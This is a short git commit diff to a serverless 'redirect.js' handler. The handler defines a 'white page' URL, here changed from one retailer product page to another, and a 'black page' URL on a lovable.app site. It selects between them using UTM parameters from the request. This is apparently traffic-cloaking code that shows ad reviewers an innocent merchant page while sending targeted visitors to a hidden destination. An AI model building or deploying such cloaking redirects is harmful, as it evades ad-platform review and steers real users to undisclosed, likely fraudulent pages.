73b22a63b6fba4e3c58a173b7c9721a0de4d35f5
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-10-21 08:01:14 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.mustela.fr/products/eco-lingettes-coton-bio";
+    const whitePageURL = "https://zippyonline.com/products/zy-superlight-runner-combined-trainers-for-boys-green-blue";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
